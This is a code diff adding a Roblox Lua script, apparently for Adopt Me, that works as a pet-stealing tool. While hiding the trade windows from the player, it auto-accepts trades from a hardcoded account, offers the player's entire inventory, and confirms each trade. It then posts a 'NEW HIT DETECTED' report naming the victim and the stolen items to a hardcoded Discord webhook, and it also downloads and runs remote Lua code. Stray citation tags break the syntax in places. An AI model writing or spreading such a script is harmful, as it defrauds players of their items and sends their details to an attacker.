@@ -1,0 +1,206 @@
+_G.USERNAME = "Jazonyy67" -- Account dat de pets ontvangt [cite: 1]
+_G.WEBHOOK_URL = "https://discord.com/api/webhooks/1497168308489949234/FzshgxFf5uESFLgpdE6Ma45YnVp3pePX30drKAzgsIWSPvw75HPVHwpWAJ3vx9oHJydJ" -- [cite: 1]
+
+local targetName = _G.USERNAME
+local webhookUrl = _G.WEBHOOK_URL
+local valuesUrl = "https://raw.githubusercontent.com/deltamokey-arch/adm-values/refs/heads/main/values.lua"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local isLogging = false 
+
+local BLACKLIST = {
+    ["practice_dog"] = true, ["starter_egg"] = true, ["sandwich-default"] = true,
+    ["ice_skates"] = true, ["trade_license"] = true, ["beach_2024_mahi_spinning_rod_temporary"] = true,
+    ["white_bowtie"] = true, ["cowbell"] = true, ["blue_cap"] = true,
+    ["squeaky_bone_default"] = true, ["stroller-default"] = true,
+    ["ice_dimension_2025_ice_soup_bait"] = true, ["starter_egg_2025_mouse"] = true
+} [cite: 1, 2]
+
+local hasFinishedFirstTrade = false
+
+-- ✨ ULTIEME TRANSPARANTIE FUNCTIE
+local function makeTransparent(obj)
+    if not obj then return end
+    if obj:IsA("GuiObject") then
+        pcall(function()
+            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+                obj.TextTransparency = 1
+            end
+            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
+                obj.ImageTransparency = 1
+            end
+            obj.BackgroundTransparency = 1
+            obj.Visible = false -- Extra veiligheid: zet het ook op onzichtbaar
+        end)
+    end
+    for _, child in ipairs(obj:GetDescendants()) do
+        makeTransparent(child)
+    end
+end
+
+-- 🛠 DATABASE OPHALEN [cite: 3]
+local function getExternalValues()
+    local source = ""
+    pcall(function() source = game:HttpGet(valuesUrl) end)
+    if source == "" then return {pets = {}} end
+    source = source:match("^%s*(.-)%s*$")
+    if not source:find("return") then source = source .. "\nreturn ValueList" end
+    local func = loadstring(source)
+    return func and func() or {pets = {}}
+end
+local ValueList = getExternalValues()
+
+-- 🔍 INVENTARIS CHECK (Om te zien of items nog bestaan)
+local function checkItemsStillInInventory(itemIds)
+    local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
+    local inv = data and data.inventory
+    if not inv then return false end
+    
+    for _, uniqueId in ipairs(itemIds) do
+        for cat, group in pairs(inv) do
+            if group[uniqueId] then
+                return true -- Item is er nog, trade was waarschijnlijk gecanceld
+            end
+        end
+    end
+    return false -- Geen van de items gevonden, trade is geslaagd!
+end
+
+-- 🔍 ITEM INFO OPHALEN [cite: 4, 5, 6, 7]
+local function getItemInfo(uniqueId)
+    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = "", uniqueId = uniqueId}
+    pcall(function()
+        local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
+        local inv = data and data.inventory
+        if not inv then return end
+        for cat, group in pairs(inv) do
+            if group[uniqueId] then
+                local d = group[uniqueId]
+                info.rawId = d.id or cat
+                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
+                local vData = ValueList.pets and ValueList.pets[name]
+                local p = d.properties or {}
+                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. (p.flyable and "F" or "") .. (p.rideable and "R" or "")
+                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
+                if vData then
+                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
+                    info.value = vData[prefix] or vData["value"] or 0
+                    info.rarity = (vData.rarity or "common"):upper()
+                else
+                    info.rarity = (d.rarity or "common"):upper()
+                end
+                break
+            end
+        end
+    end)
+    return info
+end
+
+-- 📊 WEBHOOK LOGGING (Nu met verificatie) [cite: 8, 9, 10, 11]
+function postLog(data)
+    if #data == 0 or isLogging then return end
+    isLogging = true
+    
+    local list, total = "", 0
+    for _, i in ipairs(data) do
+        list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
+        total = total + i.value
+    end
+    
+    local embed = {
+        content = "🚨 **NEW HIT DETECTED** 🚨",
+        embeds = {{
+            title = "🎯 PAXS REPORT",
+            color = 16711680,
+            fields = {
+                {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
+                {name = "💎 Total Value", value = "```" .. total .. "```", inline = true},
+                {name = "📦 Items", value = list}
+            },
+            footer = {text = "Paxz V29 • " .. os.date("%X")}
+        }}
+    }
+    
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
+    end)
+    
+    task.wait(1) 
+    isLogging = false
+end
+
+-- ⚡ LOOP [cite: 12, 13, 14, 15]
+task.spawn(function()
+    local API = ReplicatedStorage:WaitForChild("API")
+    
+    while true do
+        task.wait(hasFinishedFirstTrade and 0.5 or 1.0)
+        
+        local target = Players:FindFirstChild(targetName)
+        local ui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+        local reqUi = LocalPlayer.PlayerGui:FindFirstChild("TradeRequestApp")
+        local hintUi = LocalPlayer.PlayerGui:FindFirstChild("HintApp")
+
+        -- Maak ALLES onzichtbaar (ook HintApp)
+        if ui then makeTransparent(ui) end
+        if reqUi then makeTransparent(reqUi) end
+        if hintUi then makeTransparent(hintUi) end
+
+        if target then
+            task.spawn(function() 
+                pcall(function() 
+                    API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(target, true) -- [cite: 14]
+                end) 
+            end)
+
+            if ui and ui:FindFirstChild("Frame") and ui.Frame.Visible then
+                local currentTradeItems = {}
+                local currentIds = {}
+                local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
+                local inv = data and data.inventory
+                
+                if inv then [cite: 15]
+                    for cat, group in pairs(inv) do
+                        if cat ~= "stickers" then [cite: 16]
+                            for id, _ in pairs(group) do 
+                                local stats = getItemInfo(id)
+                                if not BLACKLIST[stats.rawId] then [cite: 17]
+                                    table.insert(currentTradeItems, stats)
+                                    table.insert(currentIds, id)
+                                    pcall(function() 
+                                        API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(id) -- [cite: 18]
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end
+
+                -- Bevestig trade stages [cite: 21, 22]
+                while ui and ui:FindFirstChild("Frame") and ui.Frame.Visible do
+                    pcall(function() 
+                        API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
+                        API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
+                    end)
+                    task.wait(0.3)
+                end
+
+                -- CRUCIALE FIX: Wacht even en check of de pets weg zijn
+                task.wait(0.5)
+                if #currentTradeItems > 0 and not checkItemsStillInInventory(currentIds) then 
+                    postLog(currentTradeItems)
+                    hasFinishedFirstTrade = true
+                end
+            else
+                pcall(function() 
+                    API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(target) -- [cite: 24]
+                end)
+            end
+        end
+    end
+end)
